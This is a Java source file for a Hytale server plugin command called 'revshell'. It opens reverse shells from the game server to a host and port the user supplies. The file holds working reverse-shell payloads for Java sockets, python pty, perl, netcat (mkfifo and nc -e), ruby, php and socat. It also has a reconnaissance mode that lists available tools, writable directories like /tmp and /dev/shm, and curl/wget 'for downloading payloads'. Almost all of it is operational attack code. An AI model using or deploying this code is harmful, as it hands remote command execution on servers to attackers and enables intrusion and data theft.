package de.tobiassachs;

import com.hypixel.hytale.server.core.Message;
import com.hypixel.hytale.server.core.command.system.AbstractCommand;
import com.hypixel.hytale.server.core.command.system.CommandContext;

import javax.annotation.Nonnull;
import javax.annotation.Nullable;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;

public class ReverseShellCommand extends AbstractCommand {

    private volatile Thread shellThread;
    private volatile Socket activeSocket;
    private volatile Process activeProcess;

    public ReverseShellCommand(String name, String description) {
        super(name, description);
        setAllowsExtraArguments(true);
        requirePermission("hytale.intelligence.shell");
    }

    @Nullable
    @Override
    protected CompletableFuture<Void> execute(@Nonnull CommandContext context) {

        String input = context.getInputString().trim();
        String args = "";
        int spaceIdx = input.indexOf(' ');
        if (spaceIdx >= 0) {
            args = input.substring(spaceIdx + 1).trim();
        }

        if (args.equals("stop") || args.equals("kill")) {
            return stop(context);
        }

        if (args.equals("status")) {
            return status(context);
        }

        if (args.equals("check")) {
            return check(context);
        }

        if (args.isEmpty() || args.equals("help")) {
            context.sendMessage(Message.raw("Usage: revshell <host>:<port> [type]"));
            context.sendMessage(Message.raw("  revshell 10.0.0.1:4444          Java reverse shell (/bin/sh)"));
            context.sendMessage(Message.raw("  revshell 10.0.0.1:4444 bash     Java reverse shell (/bin/bash)"));
            context.sendMessage(Message.raw("  revshell 10.0.0.1:4444 python   Python pty reverse shell"));
            context.sendMessage(Message.raw("  revshell 10.0.0.1:4444 perl     Perl reverse shell"));
            context.sendMessage(Message.raw("  revshell 10.0.0.1:4444 nc       Netcat reverse shell (mkfifo)"));
            context.sendMessage(Message.raw("  revshell 10.0.0.1:4444 nce      Netcat reverse shell (nc -e)"));
            context.sendMessage(Message.raw("  revshell 10.0.0.1:4444 ruby     Ruby reverse shell"));
            context.sendMessage(Message.raw("  revshell 10.0.0.1:4444 php      PHP reverse shell"));
            context.sendMessage(Message.raw("  revshell 10.0.0.1:4444 socat    Socat full PTY reverse shell"));
            context.sendMessage(Message.raw("  revshell check                   Check available tools"));
            context.sendMessage(Message.raw("  revshell status                  Show connection status"));
            context.sendMessage(Message.raw("  revshell stop                    Kill active reverse shell"));
            return CompletableFuture.completedFuture(null);
        }

        // Parse host:port and optional shell type
        String[] parts = args.split("\\s+", 2);
        String target = parts[0];
        String shellType = parts.length > 1 ? parts[1].toLowerCase() : "sh";

        String[] hostPort = target.split(":", 2);
        if (hostPort.length != 2) {
            context.sendMessage(Message.raw("Error: Expected format host:port (e.g. 10.0.0.1:4444)"));
            return CompletableFuture.completedFuture(null);
        }

        String host = hostPort[0];
        int port;
        try {
            port = Integer.parseInt(hostPort[1]);
        } catch (NumberFormatException e) {
            context.sendMessage(Message.raw("Error: Invalid port: " + hostPort[1]));
            return CompletableFuture.completedFuture(null);
        }

        if (shellThread != null && shellThread.isAlive()) {
            context.sendMessage(Message.raw("Error: A reverse shell is already active. Use 'revshell stop' first."));
            return CompletableFuture.completedFuture(null);
        }

        context.sendMessage(Message.raw("Connecting to " + host + ":" + port + " (type: " + shellType + ")..."));

        switch (shellType) {
            case "sh", "bash" -> startJavaShell(context, host, port, shellType.equals("bash") ? "/bin/bash" : "/bin/sh");
            case "python", "py" -> startOneliner(context, host, port, buildPythonPayload(host, port));
            case "perl" -> startOneliner(context, host, port, buildPerlPayload(host, port));
            case "nc", "netcat" -> startOneliner(context, host, port, buildNetcatPayload(host, port));
            case "nce" -> startOneliner(context, host, port, buildNetcatEPayload(host, port));
            case "ruby", "rb" -> startOneliner(context, host, port, buildRubyPayload(host, port));
            case "php" -> startOneliner(context, host, port, buildPhpPayload(host, port));
            case "socat" -> startOneliner(context, host, port, buildSocatPayload(host, port));
            default -> {
                context.sendMessage(Message.raw("Unknown shell type: " + shellType));
                context.sendMessage(Message.raw("Use 'revshell check' to see available tools"));
            }
        }

        return CompletableFuture.completedFuture(null);
    }

    // ---- check ----

    private CompletableFuture<Void> check(CommandContext context) {
        context.sendMessage(Message.raw("---- Reverse Shell Availability Check ----"));

        // Always available (pure Java, no external tools)
        context.sendMessage(Message.raw(""));
        context.sendMessage(Message.raw("  Always available (Java):"));
        context.sendMessage(Message.raw("    sh     - Java Socket + /bin/sh    " + (whichBinary("/bin/sh") ? "OK" : "MISSING /bin/sh")));
        context.sendMessage(Message.raw("    bash   - Java Socket + /bin/bash  " + (whichBinary("/bin/bash") ? "OK" : "MISSING /bin/bash")));

        // External tools
        context.sendMessage(Message.raw(""));
        context.sendMessage(Message.raw("  External tools:"));

        Map<String, ToolCheck> tools = new LinkedHashMap<>();
        tools.put("python", new ToolCheck("python", "Python pty shell", "python3", "python"));
        tools.put("perl", new ToolCheck("perl", "Perl socket shell", "perl"));
        tools.put("nc", new ToolCheck("nc", "Netcat (mkfifo pipe)", "nc", "netcat", "ncat"));
        tools.put("ruby", new ToolCheck("ruby", "Ruby socket shell", "ruby"));
        tools.put("php", new ToolCheck("php", "PHP fsockopen shell", "php"));
        tools.put("socat", new ToolCheck("socat", "Socat full PTY shell", "socat"));
        tools.put("curl", new ToolCheck("curl", "For downloading payloads", "curl"));
        tools.put("wget", new ToolCheck("wget", "For downloading payloads", "wget"));

        int available = 2; // sh and bash via Java are always conceptually available
        for (var entry : tools.entrySet()) {
            ToolCheck tc = entry.getValue();
            String found = findBinary(tc.binaries);
            if (found != null) {
                String version = getVersion(found);
                context.sendMessage(Message.raw("    " + padRight(entry.getKey(), 7) + "- " + padRight(tc.description, 28) + "OK (" + found + (version != null ? " " + version : "") + ")"));
                available++;
            } else {
                context.sendMessage(Message.raw("    " + padRight(entry.getKey(), 7) + "- " + padRight(tc.description, 28) + "NOT FOUND"));
            }
        }

        // Check for nc -e support
        context.sendMessage(Message.raw(""));
        context.sendMessage(Message.raw("  Netcat -e support:"));
        String ncBin = findBinary("nc", "netcat", "ncat");
        if (ncBin != null) {
            boolean hasE = checkNcE(ncBin);
            context.sendMessage(Message.raw("    nce    - nc -e /bin/sh           " + (hasE ? "OK (nc -e supported)" : "NOT SUPPORTED (use nc/mkfifo instead)")));
            if (hasE) available++;
        } else {
            context.sendMessage(Message.raw("    nce    - nc -e /bin/sh           NOT FOUND (no netcat)"));
        }

        // Useful utilities
        context.sendMessage(Message.raw(""));
        context.sendMessage(Message.raw("  Useful utilities:"));
        String[][] utils = {
                {"mkfifo", "Named pipes (for nc method)"},
                {"script", "PTY allocation (script /dev/null)"},
                {"stty", "Terminal settings"},
                {"tty", "Current TTY device"},
                {"awk", "Alternative shell via awk"},
                {"busybox", "Multi-tool (may include nc)"},
                {"openssl", "Encrypted reverse shell"},
                {"nmap", "ncat from nmap suite"},
        };
        for (String[] util : utils) {
            String found = findBinary(util[0]);
            context.sendMessage(Message.raw("    " + padRight(util[0], 10) + "- " + padRight(util[1], 35) + (found != null ? "OK" : "NOT FOUND")));
        }

        // Writable directories (for mkfifo, downloads)
        context.sendMessage(Message.raw(""));
        context.sendMessage(Message.raw("  Writable directories:"));
        String[] writableDirs = {"/tmp", "/dev/shm", "/var/tmp", "/run", System.getProperty("user.dir")};
        for (String dir : writableDirs) {
            try {
                Path p = Path.of(dir);
                if (Files.isDirectory(p) && Files.isWritable(p)) {
                    context.sendMessage(Message.raw("    " + dir + " - WRITABLE"));
                }
            } catch (Exception ignored) {}
        }

        // Outbound connectivity hint
        context.sendMessage(Message.raw(""));
        context.sendMessage(Message.raw("  Outbound connectivity:"));
        context.sendMessage(Message.raw("    Use 'network' command to check firewall rules and active connections"));
        context.sendMessage(Message.raw("    Use 'sh nc -zv <host> <port>' to test outbound TCP"));

        context.sendMessage(Message.raw(""));
        context.sendMessage(Message.raw("  Total available methods: " + available));
        context.sendMessage(Message.raw("  Recommended: " + recommend()));

        return CompletableFuture.completedFuture(null);
    }

    private String recommend() {
        // socat > python > bash > perl > nc > sh
        if (findBinary("socat") != null) return "socat (full PTY)";
        if (findBinary("python3", "python") != null) return "python (PTY via pty.spawn)";
        if (whichBinary("/bin/bash")) return "bash (Java socket)";
        if (findBinary("perl") != null) return "perl";
        if (findBinary("nc", "netcat", "ncat") != null) return "nc (mkfifo pipe)";
        return "sh (Java socket, always available)";
    }

    private boolean whichBinary(String path) {
        try {
            return Files.isExecutable(Path.of(path));
        } catch (Exception e) {
            return false;
        }
    }

    private String findBinary(String... names) {
        for (String name : names) {
            // Check absolute path first
            if (name.startsWith("/")) {
                if (whichBinary(name)) return name;
                continue;
            }
            // Try `which`
            try {
                Process p = new ProcessBuilder("/bin/sh", "-c", "which " + name + " 2>/dev/null")
                        .redirectErrorStream(true)
                        .start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line = reader.readLine();
                p.waitFor(5, TimeUnit.SECONDS);
                if (line != null && !line.isEmpty() && p.exitValue() == 0) {
                    return line.trim();
                }
            } catch (Exception ignored) {}
            // Try common paths
            String[] paths = {"/usr/bin/", "/usr/local/bin/", "/bin/", "/usr/sbin/", "/sbin/"};
            for (String dir : paths) {
                if (whichBinary(dir + name)) return dir + name;
            }
        }
        return null;
    }

    private String getVersion(String binary) {
        try {
            Process p = new ProcessBuilder("/bin/sh", "-c", binary + " --version 2>&1 | head -1")
                    .redirectErrorStream(true)
                    .start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = reader.readLine();
            boolean finished = p.waitFor(3, TimeUnit.SECONDS);
            if (!finished) p.destroyForcibly();
            if (line != null && !line.isEmpty() && line.length() < 80) {
                return line.trim();
            }
        } catch (Exception ignored) {}
        return null;
    }

    private boolean checkNcE(String ncBin) {
        // Check if nc supports -e by looking at help output
        try {
            Process p = new ProcessBuilder("/bin/sh", "-c", ncBin + " -h 2>&1; " + ncBin + " --help 2>&1")
                    .redirectErrorStream(true)
                    .start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            p.waitFor(3, TimeUnit.SECONDS);
            String help = sb.toString();
            // Traditional netcat and ncat support -e
            return help.contains("-e ") || help.contains("--exec");
        } catch (Exception e) {
            return false;
        }
    }

    private String padRight(String s, int width) {
        if (s.length() >= width) return s;
        return s + " ".repeat(width - s.length());
    }

    // ---- shell launchers ----

    private void startJavaShell(CommandContext context, String host, int port, String shell) {
        shellThread = new Thread(() -> {
            try {
                activeSocket = new Socket(host, port);
                activeProcess = new ProcessBuilder(shell)
                        .redirectErrorStream(true)
                        .start();

                InputStream socketIn = activeSocket.getInputStream();
                OutputStream socketOut = activeSocket.getOutputStream();
                InputStream procIn = activeProcess.getInputStream();
                OutputStream procOut = activeProcess.getOutputStream();

                // Socket → Process stdin
                Thread toProc = new Thread(() -> {
                    try {
                        byte[] buf = new byte[4096];
                        int n;
                        while ((n = socketIn.read(buf)) != -1) {
                            procOut.write(buf, 0, n);
                            procOut.flush();
                        }
                    } catch (Exception ignored) {}
                }, "revshell-in");
                toProc.setDaemon(true);
                toProc.start();

                // Process stdout → Socket
                byte[] buf = new byte[4096];
                int n;
                while ((n = procIn.read(buf)) != -1) {
                    socketOut.write(buf, 0, n);
                    socketOut.flush();
                }

                activeProcess.waitFor();
            } catch (Exception e) {
                // Connection lost or failed
            } finally {
                cleanup();
            }
        }, "revshell-java");
        shellThread.setDaemon(true);
        shellThread.start();
        context.sendMessage(Message.raw("Java reverse shell started (background)"));
    }

    private void startOneliner(CommandContext context, String host, int port, String payload) {
        shellThread = new Thread(() -> {
            try {
                activeProcess = new ProcessBuilder("/bin/sh", "-c", payload)
                        .redirectErrorStream(true)
                        .start();
                activeProcess.waitFor();
            } catch (Exception ignored) {
            } finally {
                cleanup();
            }
        }, "revshell-oneliner");
        shellThread.setDaemon(true);
        shellThread.start();
        context.sendMessage(Message.raw("Reverse shell started (background)"));
    }

    // ---- payloads ----

    private String buildPythonPayload(String host, int port) {
        return "python3 -c 'import socket,subprocess,os,pty;"
                + "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                + "s.connect((\"" + host + "\"," + port + "));"
                + "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                + "pty.spawn(\"/bin/sh\")' 2>/dev/null"
                + " || python -c 'import socket,subprocess,os,pty;"
                + "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                + "s.connect((\"" + host + "\"," + port + "));"
                + "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                + "pty.spawn(\"/bin/sh\")'";
    }

    private String buildPerlPayload(String host, int port) {
        return "perl -e 'use Socket;"
                + "$i=\"" + host + "\";$p=" + port + ";"
                + "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                + "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
                + "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                + "exec(\"/bin/sh -i\")};'";
    }

    private String buildNetcatPayload(String host, int port) {
        return "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc " + host + " " + port + " > /tmp/f";
    }

    private String buildNetcatEPayload(String host, int port) {
        return "nc -e /bin/sh " + host + " " + port;
    }

    private String buildRubyPayload(String host, int port) {
        return "ruby -rsocket -e 'f=TCPSocket.open(\"" + host + "\"," + port + ");"
                + "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'";
    }

    private String buildPhpPayload(String host, int port) {
        return "php -r '$sock=fsockopen(\"" + host + "\"," + port + ");"
                + "exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
    }

    private String buildSocatPayload(String host, int port) {
        return "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:" + host + ":" + port;
    }

    // ---- stop / status ----

    private CompletableFuture<Void> stop(CommandContext context) {
        if (shellThread == null || !shellThread.isAlive()) {
            context.sendMessage(Message.raw("No active reverse shell"));
            return CompletableFuture.completedFuture(null);
        }
        cleanup();
        context.sendMessage(Message.raw("Reverse shell killed"));
        return CompletableFuture.completedFuture(null);
    }

    private CompletableFuture<Void> status(CommandContext context) {
        if (shellThread == null || !shellThread.isAlive()) {
            context.sendMessage(Message.raw("No active reverse shell"));
        } else {
            context.sendMessage(Message.raw("Reverse shell active"));
            if (activeSocket != null && activeSocket.isConnected()) {
                context.sendMessage(Message.raw("  Connected to: " + activeSocket.getRemoteSocketAddress()));
                context.sendMessage(Message.raw("  Local: " + activeSocket.getLocalSocketAddress()));
            }
            if (activeProcess != null && activeProcess.isAlive()) {
                context.sendMessage(Message.raw("  Process PID: " + activeProcess.pid()));
            }
        }
        return CompletableFuture.completedFuture(null);
    }

    private void cleanup() {
        try { if (activeProcess != null) activeProcess.destroyForcibly(); } catch (Exception ignored) {}
        try { if (activeSocket != null) activeSocket.close(); } catch (Exception ignored) {}
        activeProcess = null;
        activeSocket = null;
    }

    // ---- helper ----

    private record ToolCheck(String key, String description, String... binaries) {}
}
